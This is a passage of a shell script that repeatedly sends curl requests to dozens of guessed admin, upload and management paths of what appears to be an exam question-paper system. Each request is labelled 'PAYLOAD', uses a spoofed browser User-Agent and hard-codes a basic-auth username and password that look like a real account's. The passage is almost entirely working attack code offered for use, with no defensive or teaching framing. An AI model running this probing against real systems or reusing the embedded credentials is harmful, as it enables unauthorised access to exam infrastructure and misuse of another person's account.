" "${target}Sync-QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationTestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationTestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationTestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlHandling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlHandling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlHandling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperFileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperFileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperFileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Upload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Upload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Upload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBAutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBAutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBAutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerAutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerAutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerAutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Transfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Transfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Transfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileBulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileBulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileBulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowTestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowTestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowTestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
